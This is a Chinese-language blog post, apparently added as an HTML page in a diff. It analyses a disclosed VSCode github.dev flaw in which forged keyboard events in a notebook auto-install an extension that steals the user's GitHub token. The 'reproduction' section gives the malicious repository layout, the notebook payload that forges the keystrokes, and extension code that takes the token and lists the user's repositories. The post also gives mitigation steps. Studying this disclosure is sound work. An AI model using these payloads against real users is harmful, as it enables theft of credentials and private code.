@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>点一下链接，你的 GitHub Token 就没了——VSCode github.dev 高危漏洞拆解 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>点一下链接，你的 GitHub Token 就没了——VSCode github.dev 高危漏洞拆解</h1>
+<time>2026-06-03</time>
+<ul>
+<li>VSCode</li>
+<li>安全</li>
+<li>GitHub</li>
+<li>Web安全</li>
+</ul>
+<hr />
+<p>6月2日，安全研究员 Ammar Askar 披露了一个 VSCode 漏洞：<strong>点一个链接，就能窃取你的 GitHub Token，拿到所有仓库（含私有）的读写权限。</strong> PoC 已公开，攻击链完整可复现。</p>
+<hr />
+<h2>攻击入口：github.dev</h2>
+<p><a href="https://github.dev">github.dev</a> 是 GitHub 的在线编辑器，把 <code>github.com</code> 改成 <code>github.dev</code> 就能在浏览器里跑 VSCode。问题是：github.com 会把一个<strong>不限仓库范围</strong>的 OAuth Token POST 给 github.dev。</p>
+<p><img alt="github.dev 菜单入口" src="../images/2026-06-03-vscode-token-theft/github-dev-dropdown-option.webp" /></p>
+<p>浏览器里的 VSCode + 全权限 GitHub token。攻击者眼里的完美组合。</p>
+<hr />
+<h2>漏洞：keydown 事件穿透</h2>
+<p>VSCode 用 iframe + 不同 origin 隔离 webview，理论上 Notebook 里的恶意 JS 碰不到主窗口。</p>
+<p><img alt="Webview 隔离架构" src="../images/2026-06-03-vscode-token-theft/iframe-jupyter-notebook.png" /></p>
+<p>但为了快捷键体验，VSCode 在 webview 里监听 keydown 事件并冒泡到主窗口：</p>
+<div class="highlight"><pre><span></span><code><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;keydown&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">hostMessaging</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;did-keydown&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">key</span><span class="o">:</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">ctrlKey</span><span class="o">:</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">ctrlKey</span><span class="p">,</span><span class="w"> </span><span class="nx">shiftKey</span><span class="o">:</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">shiftKey</span>
+<span class="w">  </span><span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div>
+
+<p><strong>没有任何机制阻止 webview 脚本伪造 KeyboardEvent。</strong> 恶意脚本可以模拟任意快捷键，主窗口分不出真假。</p>
+<hr />
+<h2>攻击链：三步组合</h2>
+<p>单看每一步都不算漏洞，组合起来就是完整 RCE。</p>
+<p><strong>1. 伪造快捷键接受通知</strong></p>
+<p>VSCode 的 Ctrl+Shift+A 会接受最近一条通知的主按钮。攻击者 dispatch 一个 keydown 就行。</p>
+<p><strong>2. 利用扩展推荐机制</strong></p>
+<p>仓库的 <code>.vscode/extensions.json</code> 可以推荐扩展，用户打开时弹通知。攻击者把恶意扩展写进推荐列表，用伪造的 Ctrl+Shift+A 自动点安装。</p>
+<p><img alt="扩展推荐通知" src="../images/2026-06-03-vscode-token-theft/notification-recommended-extension.png" /></p>
+<p><strong>3. 绕过发布者信任检查</strong></p>
+<p>VSCode 1.97 有发布者信任系统，但受信任工作空间里的本地扩展可以跳过。github.dev 默认受信任。</p>
+<p><img alt="发布者信任对话框" src="../images/2026-06-03-vscode-token-theft/trusted-publisher-dialog.png" /></p>
+<p>攻击者把恶意扩展放 <code>.vscode/extensions/</code> 下，通过自定义 keybind 绕过信任检查直接安装。</p>
+<h3>完整流程</h3>
+<p>Jupyter Notebook 的 Markdown cell 里放 <code>&lt;img onerror&gt;</code> 触发 JS → 等 10 秒 → 伪造 Ctrl+Shift+A 接受通知 → 等 500ms → 伪造 Ctrl+F1 安装恶意扩展 → 拿 token → 读所有私有仓库 → 外传。</p>
+<p><strong>全程零交互，除了最初那个点击。</strong></p>
+<hr />
+<h2>复现步骤（仅供研究）</h2>
+<blockquote>
+<p>⚠️ 用测试账号和空仓库。</p>
+</blockquote>
+<p><strong>仓库结构：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="n">malicious</span><span class="o">-</span><span class="n">repo</span><span class="o">/</span>
+<span class="err">├──</span><span class="w"> </span><span class="n">README</span><span class="o">.</span><span class="n">ipynb</span><span class="w">          </span><span class="c1"># payload 在这里</span>
+<span class="err">├──</span><span class="w"> </span><span class="o">.</span><span class="n">vscode</span><span class="o">/</span>
+<span class="err">│</span><span class="w">   </span><span class="err">├──</span><span class="w"> </span><span class="n">extensions</span><span class="o">.</span><span class="n">json</span><span class="w">   </span><span class="c1"># {&quot;recommendations&quot;: [&quot;attacker.evil-extension&quot;]}</span>
+<span class="err">│</span><span class="w">   </span><span class="err">└──</span><span class="w"> </span><span class="n">extensions</span><span class="o">/</span>
+<span class="err">│</span><span class="w">       </span><span class="err">└──</span><span class="w"> </span><span class="n">evil</span><span class="o">-</span><span class="n">ext</span><span class="o">/</span><span class="w">     </span><span class="c1"># 本地恶意扩展</span>
+<span class="err">│</span><span class="w">           </span><span class="err">├──</span><span class="w"> </span><span class="n">package</span><span class="o">.</span><span class="n">json</span><span class="w">   </span><span class="c1"># 自定义 keybind → installExtension</span>
+<span class="err">│</span><span class="w">           </span><span class="err">└──</span><span class="w"> </span><span class="n">extension</span><span class="o">.</span><span class="n">js</span><span class="w">   </span><span class="c1"># 读取 GitHub token 并外传</span>
+</code></pre></div>
+
+<p><strong>Notebook payload 核心：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="k">await</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mf">10000</span><span class="p">);</span>
+<span class="c1">// 伪造 Ctrl+Shift+A 接受通知</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">dispatchEvent</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">KeyboardEvent</span><span class="p">(</span><span class="s1">&#39;keydown&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">key</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;KeyA&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">keyCode</span><span class="o">:</span><span class="w"> </span><span class="mf">65</span><span class="p">,</span><span class="w"> </span><span class="nx">ctrlKey</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="nx">shiftKey</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="p">}));</span>
+<span class="k">await</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mf">500</span><span class="p">);</span>
+<span class="c1">// 伪造 Ctrl+F1 触发自定义 keybind</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">dispatchEvent</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">KeyboardEvent</span><span class="p">(</span><span class="s1">&#39;keydown&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">key</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;F1&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;F1&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">keyCode</span><span class="o">:</span><span class="w"> </span><span class="mf">112</span><span class="p">,</span><span class="w"> </span><span class="nx">ctrlKey</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="p">}));</span>
+</code></pre></div>
+
+<p><strong>extension.js 核心：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">vscode</span><span class="p">.</span><span class="nx">authentication</span><span class="p">.</span><span class="nx">getSession</span><span class="p">(</span><span class="s1">&#39;github&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;repo&#39;</span><span class="p">],</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">createIfNone</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">});</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">session</span><span class="p">.</span><span class="nx">accessToken</span><span class="p">;</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">repos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://api.github.com/user/repos&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s1">&#39;Authorization&#39;</span><span class="o">:</span><span class="w"> </span><span class="sb">`token </span><span class="si">${</span><span class="nx">token</span><span class="si">}</span><span class="sb">`</span><span class="w"> </span><span class="p">}</span>
+<span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+</code></pre></div>
+
+<p>访问 <code>https://github.dev/&lt;username&gt;/malicious-repo/blob/main/README.ipynb</code> 即可触发。</p>
+<p><img alt="PoC 执行状态" src="../images/2026-06-03-vscode-token-theft/poc-status-page.png" /></p>
+<p><img alt="PoC 结果：Token 和私有仓库被窃取" src="../images/2026-06-03-vscode-token-theft/poc-info-box.png" /></p>
+<hr />
+<h2>影响与自保</h2>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>风险</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>github.dev</td>
+<td>高（点链接即触发）</td>
+</tr>
+<tr>
+<td>VSCode 桌面版</td>
+<td>中（需 clone + 打开 Notebook）</td>
+</tr>
+<tr>
+<td>其他 Webview XSS</td>
+<td>高（可升级为 RCE）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>现在就做：</strong></p>
+<ol>
+<li><strong>清除 github.dev 本地存储</strong> — Chrome 地址栏图标 → Cookies and site data → 删除 github.dev 相关条目</li>
+</ol>
+<p><img alt="管理站点数据" src="../images/2026-06-03-vscode-token-theft/manage-site-data.png" />
+<img alt="删除站点数据" src="../images/2026-06-03-vscode-token-theft/delete-site-data.png" /></p>
+<ol>
+<li><strong>审计 GitHub OAuth 授权</strong> — Settings → Applications → Authorized OAuth Apps</li>
+<li><strong>对 github.dev 链接保持警惕</strong> — 先看仓库内容再决定开不开</li>
+</ol>
+<hr />
+<h2>几句闲话</h2>
+<p>VSCode 的纵深防御没毛病：CSP 阻止了扩展页 XSS，DOMPurify 净化了 Markdown，iframe 隔离架构也对。问题出在 keydown 转发这个"为了体验"的设计决策。</p>
+<p>每个为了便利性绕过安全边界的决策，都是潜在的攻击面。这不是 VSCode 的特例，是所有软件工程的通用规律。</p>
+<p>研究员选 Full Disclosure 也有原因——之前向 MSRC 报告 VSCode 安全问题，微软默默修了 bug 没给致谢，还标记为"无安全影响"。安全研究者的劳动不该被轻视。</p>
+<hr />
+<h2>⚠️ 网络安全免责声明</h2>
+<p>本文内容仅供技术研究与安全学习之用。请勿将本文所述技术用于任何未经授权的安全测试、渗透攻击或非法用途。任何因滥用本文信息而造成的法律后果，由使用者自行承担，与本文作者无关。</p>
+<p>如发现系统安全漏洞，请通过合法渠道向相关厂商或平台报告，共同维护网络安全生态。</p>
+<hr />
+<p><em>参考来源：<a href="https://blog.ammaraskar.com/github-token-stealing/">1-Click GitHub Token Stealing via a VSCode Bug</a> — Ammar Askar, 2026-06-02</em></p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
